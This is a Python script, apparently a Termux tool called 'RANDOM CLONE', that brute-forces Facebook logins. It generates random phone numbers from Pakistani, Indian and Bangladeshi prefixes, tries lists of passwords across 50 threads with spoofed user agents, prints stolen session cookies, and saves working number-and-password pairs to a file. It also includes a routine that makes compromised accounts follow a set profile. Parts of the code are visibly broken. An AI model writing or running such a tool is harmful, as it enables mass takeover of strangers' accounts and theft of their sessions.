"""
RIMON AHMED
OPEN SOURCE
GIFT TERMUX_COUESE TEAM
"""
import os
os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
import os
import sys
import time
import requests
import uuid
os.system('git pull')
os.system('pkg install curl')


class jalan:
    
    def __init__(self, z):
        pass

def linex():
	print('\033[1;95m═════════════════════════════════════════════')
def o():
    os.system('clear')
    print(logo)
    print('\tRANDOM NUMBER CRACK')
    linex()
    print('\x1b[1;32m [1]\x1b[1;33m RANDOM CRACK ')
    print('\x1b[1;32m [2] \x1b[1;32mCONTACT ME ON FACEBOOK')
    print(' \x1b[1;32m[0] \x1b[1;31mEXIT')
    linex()
    opt = input('\x1b[1;32m Choose option >>> ')
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-open ')
    if None == '0':
        os.system('exit')


import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[ðŸŽ®] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[ðŸŽ®] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')
 
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://free.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            
 
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo = (""" \033[1;32m
    AAA   HH   HH MM    MM EEEEEEE DDDDD   
   AAAAA  HH   HH MMM  MMM EE      DD  DD  
  AA   AA HHHHHHH MM MM MM EEEEE   DD   DD 
  AAAAAAA HH   HH MM    MM EE      DD   DD 
  AA   AA HH   HH MM    MM EEEEEEE DDDDDD
\033[1;95m═════════════════════════════════════════════
\033[1;35m[\033[1;32m=\033[1;35m] \33[1;92mDEVELOPER\033[1;97m ➤  \33[1;92mRIMON AHMED    
\033[1;35m[\033[1;32m=\033[1;35m] \33[1;92mFACEBOOK\033[1;97m  ➤  \33[1;92mMD RIMON    
\033[1;35m[\033[1;32m=\033[1;35m] \33[1;92mGITHUB\033[1;97m    ➤  \33[1;92mRIMON-143
\033[1;35m[\033[1;32m=\033[1;35m] \33[1;92mVERSION\033[1;97m   ➤  \33[1;92m1.0
\033[1;35m[\033[1;32m=\033[1;35m] \33[1;92mTOOLS\033[1;97m     ➤  \033[1;92mRANDOM CLONE
\033[1;95m═════════════════════════════════════════════""")

loop = 0
oks = []
cps = []
 

def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
 
#User agents
ugen2=[]
ugen=[]
 
for xd in range(50000):
    aa='Mozilla/5.0 (Linux; U; Android 11;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='fr-fr; Redmi Note 11 Build/'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l=' Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
# APK CHECK
def i():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)    
    print("\033[1;37m\t  USE OUR COUNTRY CODE  ")
    linex()
    print('\033[1;36m     \t     PAK CODES\n     \033[1;33m92301, \033[1;33m92302 ,\033[1;33m92303 ,\033[1;33m92305  ...\033[0;97m')
    linex()
    print('\033[1;36m     \t     INDIA CODES\n     \033[1;33m+91638, \033[1;33m+91701 ,\033[1;33m+91620 ,\033[1;33m+91712  ...\033[0;97m')
    linex()
    print('\033[1;36m     \t     BD CODES\n     \033[1;33m016, \033[1;33m017 ,\033[1;33m018 ,\033[1;33m019  ...\033[0;97m')
    linex()
    code = input('\033[1;32m PUT CODE : ')
    print("")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = int(input("\033[1;32m[=] Enter Password Limit : "))
    HamiiID = []
    print("")
    for bilal in range(passx):
        linex()
        pww = input("\033[1;32m[=] Enter Password : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print('\033[1;36m TOTAL IDS: '+tl)
        print('\033[1;36m THE PROCESS HAS BEEN STARTED')
        print('\033[1;31m USE AEROPLANE MOOD IN EVERY 4 MIN ')
        linex()
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
            manshera.submit(rcrack,uid,pwx,tl)
    print('\033[1;32m')
    linex()
    print('\033[1;32m[√] CRACK PROCESS HAS BEEN COMPLETED')
    print('\033[1;32m[√] IDS SAVED IN YOUR FILE')
    linex()
 
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://m.prod.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'm.prod.facebook.com',
           'method': 'GET',
           'path': '/login/device-based/login/async/',
           'scheme': 'https',
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'sb=0x2lZTZHuBIsWVPTRh4eIIxm; datr=qfW7ZYRLbFNAGhZ6Mfo_FbOB; vpd=v1%3B1013x513x2.106250047683716; ps_n=0; ps_l=0; wl_cbv=v2%3Bclient_version%3A2403%3Btimestamp%3A1707062627; m_pixel_ratio=2.106250047683716; locale=en_GB; wd=513x1013; fr=0P2a9HI5Pht2LFJVY.AWX7roSw3X7bWwl4rsD9TGquyIo.BlpR3T.3l.AAA.0.0.Blv7Wm.AWWtA7b0ynI',
    'dpr': '2.106250047683716',
    'referer': 'https://m.prod.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"Infinix X6812"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"11.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro}
            lo = session.post('https://m.prod.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                	print('\n\033[1;32m [RIMON-OK💚] ' +uid+ ' | ' +ps+ ' \033[0;97m')
                	print('[‎‎🍪]\033[0;33m COOKIE = \033[1;34m '+coki)
                	cek_apk(session,coki)
                	linex()
                	open('/sdcard/RIMON-OK.txt', 'a').write( uid+' | '+ps+'\n')
                	oks.append(cid)
                	break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
             #   print('\33[1;30m[RIMON-CP]' +uid+ ' | ' +ps+ '  \33[0;97m')
                open('/sdcard/RIMON-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mRIMON\x1b[1;92m-\x1b[1;92mXD\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)))
        sys.stdout.flush()
    except:
        pass
       
       
o()       

